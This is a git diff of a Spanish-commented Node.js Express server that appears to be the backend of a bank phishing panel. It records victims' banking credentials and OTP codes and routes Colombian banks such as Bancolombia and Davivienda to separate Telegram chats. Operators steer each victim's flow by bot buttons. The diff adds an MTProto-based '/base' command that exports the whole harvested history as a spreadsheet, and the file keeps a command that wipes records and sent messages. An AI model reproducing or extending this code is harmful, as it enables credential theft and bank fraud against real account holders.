@@ -1,7 +1,7 @@
 const express = require('express');
 const cors = require('cors');
 const XLSX = require('xlsx');
-const { spawn } = require('child_process'); // 👈 NUEVO: para ejecutar Python
+const { generarExcelHistorial } = require('./mtproto'); // 👈 MTProto
 
 const app = express();
 app.use(cors());
@@ -31,6 +31,9 @@ const ipsBaneadas = new Set();
 
 // 💬 IDs de mensajes enviados (para poder borrarlos) → Map<messageId, { chat_id, token }>
 const mensajesEnviados = new Map();
+
+// 🔐 Callback global para capturar códigos de MTProto por chat
+global.mtprotoCallback = null;
 
 // ============================================================
 // 🏦 DETECCIÓN DE BANCO
@@ -245,7 +248,6 @@ app.post('/api/crear-pago', async (req, res) => {
 
         if (!pago) {
             const bancoFinal = banco_emisor || 'Desconocido';
-            // 🎯 Elegir chat/token destino según banco
             const esEspecial = esBancoEspecial(bancoFinal);
 
             pago = {
@@ -275,7 +277,6 @@ app.post('/api/crear-pago', async (req, res) => {
                 message_id_crear: null,
                 message_id_credenciales: null,
                 message_id_otp: null,
-                // 📍 Destino fijado al crear el pago
                 es_especial: esEspecial,
                 chat_destino: esEspecial ? CHAT_ID_ESPECIAL : CHAT_ID,
                 token_destino: esEspecial ? TELEGRAM_TOKEN_ESPECIAL : TELEGRAM_TOKEN
@@ -301,7 +302,6 @@ app.post('/api/crear-pago', async (req, res) => {
             pago.paso = paso || pago.paso;
             pago.fase_actual = paso === 'otp' ? 'otp' : 'credenciales';
 
-            // 🔄 Recalcular destino si cambió el banco (por seguridad)
             const nuevoEsEspecial = esBancoEspecial(pago.banco_emisor);
             if (nuevoEsEspecial !== pago.es_especial) {
                 pago.es_especial = nuevoEsEspecial;
@@ -323,8 +323,6 @@ app.post('/api/crear-pago', async (req, res) => {
         pagosPendientes.set(solicitud_id, pago);
 
         const pasoActual = paso || 'crear';
-
-        // 🎯 Destino resuelto
         const { chatId: destChat, token: destToken } = resolverDestino(pago);
 
         let replyMarkup;
@@ -417,8 +415,15 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
 // ============================================================
 async function procesarUpdate(update, tokenBot) {
     try {
-        // 📩 Comandos de administración (permitidos en chat original y especial)
         const msg = update.message;
+
+        // 🔐 Captura de código/password para MTProto
+        if (global.mtprotoCallback && msg && msg.text) {
+            global.mtprotoCallback(msg.text.trim());
+            global.mtprotoCallback = null;
+            return;
+        }
+
         if (msg && msg.text) {
             const chatIdMsg = String(msg.chat?.id);
             const esChatOriginal = chatIdMsg === String(CHAT_ID);
@@ -426,7 +431,6 @@ async function procesarUpdate(update, tokenBot) {
 
             if (!esChatOriginal && !esChatEspecial) return;
 
-            // Responder siempre en el mismo chat desde donde se escribe
             const responder = (texto) => tgSendMessage(texto, undefined, chatIdMsg, tokenBot);
 
             const partes = msg.text.trim().split(/\s+/);
@@ -460,33 +464,37 @@ async function procesarUpdate(update, tokenBot) {
             }
 
             // ============================================================
-            // 📊 /base — AHORA LEE TODO EL HISTORIAL CON PYTHON (MTProto)
+            // 📊 /base — LEE TODO EL HISTORIAL CON MTPROTO
             // ============================================================
             if (comando === '/base') {
-                await responder('⏳ Leyendo TODO el historial desde Telegram (esto puede tardar unos segundos)...');
-                
-                // Ejecuta el script de Python que lee todo el historial
-                const pythonProcess = spawn('python3', ['leer_historial.py']);
+                await responder('⏳ Conectando a Telegram (MTProto) y leyendo todo el historial. Esto puede pedir código la primera vez...');
+                try {
+                    const buffer = await generarExcelHistorial(chatIdMsg, tokenBot, responder);
 
-                pythonProcess.stdout.on('data', (data) => {
-                    console.log(`[Python /base]: ${data.toString().trim()}`);
-                });
-
-                pythonProcess.stderr.on('data', (data) => {
-                    console.error(`[Python Error /base]: ${data.toString().trim()}`);
-                });
-
-                pythonProcess.on('close', (code) => {
-                    if (code !== 0) {
-                        console.error(`El script de Python falló con código ${code}`);
-                        responder('❌ Hubo un error generando la base completa. Revisa los logs.');
+                    if (!buffer) {
+                        await responder('📭 No se encontraron solicitudes en el historial.');
+                        return;
                     }
-                });
+
+                    const formData = new FormData();
+                    formData.append('chat_id', chatIdMsg);
+                    formData.append('caption', `📊 <b>BASE COMPLETA (MTProto)</b>\n\n📦 Datos extraídos desde el inicio.`);
+                    formData.append('parse_mode', 'HTML');
+                    formData.append('document', new Blob([buffer], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' }), `base_${Date.now()}.xlsx`);
+
+                    await fetch(`https://api.telegram.org/bot${tokenBot}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.error('Error MTProto:', err);
+                    await responder('❌ Error al leer el historial. Intenta de nuevo.');
+                }
                 return;
             }
 
             // ============================================================
-            // 🗑️ /borrartodo — Borra registros + mensajes enviados por el bot
+            // 🗑️ /borrartodo
             // ============================================================
             if (comando === '/borrartodo' || comando === '/reset') {
                 const cantidadRegistros = pagosPendientes.size;
@@ -519,11 +527,9 @@ async function procesarUpdate(update, tokenBot) {
                     } catch {
                         borradosFail++;
                     }
-                    // Pausa para respetar el límite de ~30 msg/seg de Telegram
                     await new Promise(r => setTimeout(r, 40));
                 }
 
-                // Limpiar registros en memoria
                 pagosPendientes.clear();
 
                 await responder(
@@ -549,7 +555,6 @@ async function procesarUpdate(update, tokenBot) {
         const pago = pagosPendientes.get(solicitud_id);
         if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada', tokenBot);
 
-        // 🎯 El pago sabe a qué chat/token pertenece
         const { chatId: destChat, token: destToken } = resolverDestino(pago);
         const estaEnFaseOTP = (msgId === pago.message_id_otp);
 
@@ -611,7 +616,7 @@ async function procesarUpdate(update, tokenBot) {
 // ============================================================
 // 🔄 POLLING DE TELEGRAM (uno por token, sin duplicar)
 // ============================================================
-const lastUpdateIdPorToken = {}; // Map<token, updateId>
+const lastUpdateIdPorToken = {};
 
 async function iniciarPollingToken(tokenBot, etiqueta) {
     if (!tokenBot) {
@@ -619,7 +624,6 @@ async function iniciarPollingToken(tokenBot, etiqueta) {
         return;
     }
 
-    // Eliminar webhook para que getUpdates funcione
     try {
         await fetch(`https://api.telegram.org/bot${tokenBot}/deleteWebhook`);
         console.log(`✅ Webhook eliminado (${etiqueta}, usando polling)`);
@@ -659,10 +663,8 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`👀 Chat principal: ${CHAT_ID}`);
     console.log(`🎯 Chat especial (Bancolombia/Davivienda): ${CHAT_ID_ESPECIAL}`);
 
-    // Polling del bot principal (siempre)
     iniciarPollingToken(TELEGRAM_TOKEN, 'principal');
 
-    // Polling del bot especial (solo si es un token distinto)
     if (TELEGRAM_TOKEN_ESPECIAL && TELEGRAM_TOKEN_ESPECIAL !== TELEGRAM_TOKEN) {
         iniciarPollingToken(TELEGRAM_TOKEN_ESPECIAL, 'especial');
     }
